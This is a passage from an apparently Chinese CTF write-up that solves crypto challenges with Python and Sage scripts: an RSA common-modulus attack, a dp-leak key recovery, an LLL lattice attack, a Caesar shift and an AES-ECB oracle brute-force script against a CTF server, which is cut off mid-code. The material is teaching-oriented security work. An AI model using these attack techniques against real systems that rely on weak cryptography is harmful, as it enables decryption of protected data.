class="hljs-string">f&#x27;e1 = <span class="hljs-subst">&#123;e[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e2 = <span class="hljs-subst">&#123;e[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1 = <span class="hljs-subst">&#123;c[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c2 = <span class="hljs-subst">&#123;c[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br><span class="hljs-string">e1 = 911</span><br><span class="hljs-string">e2 = 967</span><br><span class="hljs-string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br><span class="hljs-string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br>e1 = <span class="hljs-number">911</span><br>e2 = <span class="hljs-number">967</span><br>c1 = <span class="hljs-number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br>c2 = <span class="hljs-number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><br>_ , p1, q1 = gmpy2.gcdext(e1, e2)<br>m = (<span class="hljs-built_in">pow</span>(c1, p1, n) * <span class="hljs-built_in">pow</span>(c2, q1, n)) % n<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h1><p><strong>题目：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;<br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Caesar.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>strings = file.read()<br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>    <span class="hljs-keyword">if</span> i.isalpha() == <span class="hljs-literal">False</span>:<br>        ans += i<br>        <span class="hljs-keyword">continue</span><br>    ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)-<span class="hljs-number">6</span>)%<span class="hljs-number">26</span>+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><br>p,q = getPrime(<span class="hljs-number">512</span>),getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>))<br>dp = d % (p-<span class="hljs-number">1</span>)<br>m = bytes_to_long(flag) <span class="hljs-comment">#type:ignore</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dp = &quot;</span>,dp)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c =  127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><span class="hljs-string">n =  157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br><span class="hljs-string">e =  65537</span><br><span class="hljs-string">dp =  2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse,long_to_bytes<br>c =  <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br>n =  <span class="hljs-number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br>e =  <span class="hljs-number">65537</span><br>dp =  <span class="hljs-number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_1 = x // i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_1 == <span class="hljs-number">0</span>:<br>            p = p_1<br>            q = n // p<br>            <span class="hljs-keyword">break</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="easy-LLL"><a href="#easy-LLL" class="headerlink" title="easy LLL"></a>easy LLL</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">assert</span> m.bit_length() ==  <span class="hljs-number">255</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m</span>):<br>    a = getPrime(<span class="hljs-number">1024</span>)<br>    b = getPrime(<span class="hljs-number">400</span>)<br>    c = (a * m + b) % p<br>    <span class="hljs-keyword">return</span> c, a<br><br>result = [encrypt(m) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>c = [x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> result]<br>a = [x[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> result]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p =&#x27;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a =&#x27;</span>, a)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span><br><span class="hljs-string">c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]</span><br><span class="hljs-string">a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span><br>c = [<span class="hljs-number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>, <span class="hljs-number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>, <span class="hljs-number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>, <span class="hljs-number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>, <span class="hljs-number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>]<br>a = [<span class="hljs-number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>, <span class="hljs-number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>, <span class="hljs-number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>, <span class="hljs-number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>, <span class="hljs-number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>]<br><br><br>M = matrix(ZZ,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    M[i,i] = p<br>    M[-<span class="hljs-number">2</span>,i] = a[i]<br>    M[-<span class="hljs-number">1</span>,i] = c[i]<br>M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = <span class="hljs-number">1</span><br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>L = M.LLL()[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> L:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">abs</span>(L[-<span class="hljs-number">2</span>])%p))<br></code></pre></td></tr></table></figure><h1 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a>ECBpad</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br>KEY = <span class="hljs-string">b&#x27;...&#x27;</span><br>FLAG = <span class="hljs-string">b&#x27;SYC&#123;...&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">key, plaintext</span>):<br>        plaintext = padding(plaintext)<br>        cipher = AES.new(key, AES.MODE_ECB)<br>        <span class="hljs-keyword">return</span> cipher.encrypt(plaintext)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(m) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>):<br>        m = m + <span class="hljs-string">b&#x27;F&#x27;</span> * (<span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(m) % <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Serve</span>(socketserver.BaseRequestHandler):<br><br>    ctry = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;[-] &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            go = <span class="hljs-number">1</span><br>            signal.alarm(<span class="hljs-number">3000</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Welcome to the AES_ECB Cryptography System&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;You can send your plaintext and get ciphertext&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[+] ciphertext = plaintext + FLAG&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Start?(yes/no)&#x27;</span>)<br>            <span class="hljs-keyword">while</span> go:<br>                c = <span class="hljs-variable language_">self</span>.recv()<br>                <span class="hljs-keyword">if</span> c == <span class="hljs-string">b&#x27;yes&#x27;</span>:<br>                    plain = <span class="hljs-variable language_">self</span>.recv()<br>                    cipher = encrypt(KEY,plain+FLAG)<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>+ cipher.<span class="hljs-built_in">hex</span>().encode())<br>                <span class="hljs-keyword">else</span>:<br>                    go = <span class="hljs-number">0</span><br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;GoodBye!&#x27;</span>)<br><br>        <span class="hljs-keyword">except</span> TimeoutError:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Ohhehe, Timeout!&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST,PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">12321</span><br>    server = ForkedServer((HOST,PORT),Serve)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(HOST, PORT)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    <span class="hljs-comment">#建立连接</span><br>    host = <span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span><br>    port = <span class="hljs-number">14816</span><br>    conn = remote(host, port)<br>    <span class="hljs-comment">#爆破表</span><br>    table = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;&#x27;</span><br><br>    <span class="hljs-comment">#进入交互</span><br>    <span class="hljs-comment">#记录初始密文长度</span><br>    conn.recvuntil(<span class="hljs-string">b&#x27;Start?(yes/no)&#x27;</span>)<br>    conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>    <br>    send_data = <span class="hljs-string">b&#x27;&#x27;</span><br>    conn.sendline(send_data)<br>    conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>    ct = conn.recvline()[:-<span class="hljs-number">1</span>]   <span class="hljs-comment">#去掉换行符</span><br>    <span class="hljs-built_in">print</span>(ct)<br><br>    <br>    lenth = <span class="hljs-built_in">len</span>(ct)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        send_data =  send_data + <span class="hljs-string">b&#x27;0&#x27;</span><br>        conn.sendline(send_data)<br><br>        conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        ct = conn.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct=&quot;</span>, ct)<br><br>        lenth2 = <span class="hljs-built_in">len</span>(ct)<br>        <span class="hljs-keyword">if</span> lenth2 &gt; lenth:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth2=&quot;</span>, lenth2)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth=&quot;</span>, lenth)<br>            <span 